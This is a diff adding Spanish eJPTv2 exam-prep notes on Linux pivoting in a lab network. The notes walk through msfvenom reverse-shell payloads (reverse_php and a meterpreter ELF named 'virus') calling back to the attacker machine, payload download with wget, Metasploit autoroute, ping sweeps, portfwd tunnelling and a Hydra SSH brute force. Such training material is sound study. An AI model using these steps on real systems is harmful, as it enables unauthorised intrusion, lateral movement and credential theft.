@@ -1214,7 +1214,208 @@ Entonces, si quiero acceder al puerto 80 de la máquina víctima, será suficien
 
 http://10.10.10.5:7171  
 
-![157](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/157.jpg)    
+![157](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/157.jpg)  
+
+# Pivoting en entornos Linux  
+
+ESQUEMA DE RED UTILIZADO EN ESTA SIMULACIÓN  
+Máquina Kali: 10.10.10.10    
+Máquina Friendly: 10.10.10.20    
+                  172.16.0.6   
+Máquina Basic: 172.16.0.7    
+
+Primero, intentaremos explotar la máquina Friendly, que tiene un FTP vulnerable al que se puede acceder con login anónimo.  
+Lo que haremos será crear un payload malicioso con msfvenom. Escribiremos entonces el comando:  
+
+`sudo msfvenom -p php/reverse_php LHOST=10.10.10.10 LPORT=6969 -f raw > file.php`  
+
+Entonces cargaremos el archivo malicioso con FTP.  
+
+![158](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/158.jpg)  
+
+Entonces, ejecutaremos el archivo infectado accediendo a la dirección http://10.10.10.20/file.php después de haber puesto la máquina atacante en escucha en el puerto 6969 (el utilizado durante la creación del payload).  
+
+De esta manera, recibiremos una shell, que deberemos convertir para obtener una más estable.  
+
+![159](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/159.jpg)      
+
+![160](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/160.jpg)   
+
+Ahora intentaremos escalar los privilegios para convertirnos en ROOT, porque de lo contrario NO PODREMOS HACER PIVOTING.   
+
+![161](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/161.jpg)   
+
+![162](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/162.jpg)   
+
+Perfecto, ahora deberé generar un payload con msfvenom para obtener una sesión meterpreter, fundamental para realizar pivoting.   
+
+Generaré el payload con el comando:  
+
+`sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=7070 -f elf -b '\x00\x0a\x0d' -o virus`  
+
+Entonces lo transferiré a la máquina víctima con Python.  
+
+![163](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/163.jpg)  
+
+Entonces lo descargaré en la máquina víctima con `wget`.  
+
+![164](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/164.jpg)   
+
+Ahora deberé ejecutar Metasploit para obtener una sesión meterpreter.  
+Escribiré el comando `use /multi/handler` y verificaré las opciones.  
+
+![165](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/165.jpg)   
+
+Como se puede notar, el payload no es el correcto; de hecho, debo utilizar el mismo que se usó durante la creación del payload "virus" y configurar las otras opciones.  
+
+![166](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/166.jpg)    
+
+Ahora me trasladaré a la máquina víctima y otorgaré los permisos necesarios para que se pueda ejecutar el archivo "virus".  
+
+![167](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/167.jpg)   
+
+Si todo va como se espera, en la sesión de Metasploit habré obtenido una sesión meterpreter.  
+
+![168](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/168.jpg)   
+
+**¡SUPER IMPORTANTE!**  
+Recuerda que para poder realizar el pivoting, ¡debo ser ROOT!  
+
+Ahora puedo escribir el comando `ifconfig` para ver si hay redes adicionales.  
+
+![169](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/169.jpg)   
+
+Como podemos notar, hay otra interfaz, la 172.16.0.6.    
+Ahora pondremos esta sesión en segundo plano con el comando `Ctrl + Z`.    
+
+![170](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/170.jpg)     
+
+Ahora ejecutaremos este módulo:  
+
+`use /multi/manage/autoroute`  
+
+El único parámetro que debemos configurar es el ID de sesión, así que ejecutamos con el comando `run`.  
+
+![171](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/171.jpg)    
+
+Con el comando `route`, podemos verificar que las redes estén efectivamente conectadas.  
+
+![172](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/172.jpg)  
+
+Ahora lo que queremos hacer es descubrir qué otras máquinas están presentes en la nueva red recién descubierta.  
+
+¡CONSEJO!   
+Los módulos de Metasploit no funcionan muy bien, por lo que es conveniente crear un script en bash y ejecutarlo. El código es el siguiente (por supuesto, modifica las IP según corresponda):   
+
+![173](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/173.jpg)   
+
+Puedo hacer lo mismo con un comando de una sola línea, ajustando las IP según sea necesario.  
+
+Ping sweep oneliner Linux  
+
+`for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done`  
+
+Ping sweep oneliner Windows  
+
+`for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.`  
+
+Una vez creado el script, regreso a la sesión meterpreter y entro con el comando:  
+
+`sessions -i 1`  
+
+Entonces, escribo `shell` y con el comando `wget` descargo el script que acabo de crear.  
+
+![174](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/174.jpg)  
+
+Luego, le daré permisos de ejecución y lo ejecutaré.  
+
+![175](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/175.jpg)    
+
+Perfecto, la máquina vulnerable es la 172.16.0.7.   
+Ahora pondremos la sesión en segundo plano.    
+
+![176](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/176.jpg)    
+
+y también pondremos en segundo plano la sesión meterpreter para regresar a Metasploit.  
+
+![177](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/177.jpg)  
+
+Ahora que hemos identificado la máquina víctima, querré usar un módulo para realizar un escaneo de los puertos abiertos.  
+El módulo es:  
+
+`use scanner/portscan/tcp`  
+
+Configuro las opciones, en este caso `RHOSTS`, pero recuerda que si en el examen se solicita qué servicio está ejecutándose en el puerto 12000, deberé modificar el parámetro `PORTS` para ampliar el número de puertos a escanear.  
+
+![178](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/178.jpg)      
+
+![179](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/179.jpg)    
+
+Ahora, como ya se vio en el pivoting en Windows, queremos "redirigir" los puertos de manera que pueda usarlos directamente desde la máquina atacante.   
+
+Verificaremos qué sesión está activa y entraremos de nuevo en la sesión meterpreter.  
+
+![180](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/180.jpg)    
+
+Ahora usaremos este comando para realizar el redireccionamiento:  
+
+`portfwd add -l 2222 -p 22 -r 172.16.0.7`  
+
+Lo que hará es redirigir el puerto 22 de la máquina víctima al puerto 2222 de la máquina atacante.  
+
+![181](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/181.jpg)   
+
+Entonces, si ahora desde la máquina Kali ejecuto:  
+
+`ssh -p 2222 dimitri@127.0.0.1`  
+
+podré conectarme a SSH.  
+
+![182](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/182.jpg)   
+
+También podríamos usar Hydra para realizar ataques de fuerza bruta con el comando:  
+
+`sudo hydra -l dimitri -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 2222 -t 4`  
+
+![183](https://github.com/giustiand/Apuntes-eJPTv2/blob/main/images/183.jpg)   
+
+Si en lugar de eso quisiera redirigir otros puertos, tendré que escribir, como se vio antes, el comando `portfwd` con el puerto remoto y el puerto de la máquina local.  
+
+`portfwd add -l 3333 -p 631 -r 172.16.0.7`  
+
+SCRIPT SCAN.SH utilizado en la demostración  
+
+`#!/bin/bash
+
+for i in {1..255}; do
+        timeout 1 bash -c "ping -c 1 172.16.0.$i" >/dev/null
+        if [ $? -eq 0 ]; then
+                echo "Host 172.16.0.$i ONLINE"
+        fi
+done`  
+
+**NOTAS ADICIONALES**
+
+Para enumerar otros posibles hosts presentes en la máquina comprometida, podemos realizar un barrido de ping con un comando de una sola línea.  
+
+Busca en Google "ping sweep oneliner" y puedes encontrar la página rubyguides.com, que contiene exactamente lo que estábamos buscando.  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
